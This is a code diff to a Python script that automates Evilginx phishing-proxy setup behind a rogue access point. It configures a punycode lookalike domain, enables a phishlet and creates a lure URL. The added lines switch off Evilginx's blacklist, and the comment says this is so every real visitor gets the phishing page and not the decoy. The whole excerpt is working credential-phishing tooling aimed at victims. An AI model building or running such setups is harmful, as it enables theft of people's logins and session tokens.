@@ -115,10 +115,17 @@ def run_evilginx_setup(phishlet, domain_puny, landing_sub):
     cmds = "\n".join([
         "config domain %s" % domain_puny,
         "config ipv4 %s" % AP_IP,
+        # Turn the blacklist off. In the phishkin3 setup every victim request
+        # transits through the AP, so their apparent source IP for evilginx
+        # sits inside the AP's own subnet; a stray probe or curl to the wrong
+        # URL adds an entry, and after that every real visitor gets served the
+        # unauth_url (rickroll) instead of the phishlet. The blacklist file
+        # gets emptied too so an entry from a previous run does not survive.
+        "blacklist off",
         "phishlets hostname %s %s" % (phishlet, domain_puny),
         "phishlets enable %s" % phishlet,
         "lures create %s" % phishlet,
-        # get-url 0 is now safe because the store was cleared: lure 0 is the one
+        # get-url 0 is safe because the store was cleared: lure 0 is the one
         # just created for this phishlet.
         "lures get-url 0",
         "exit",
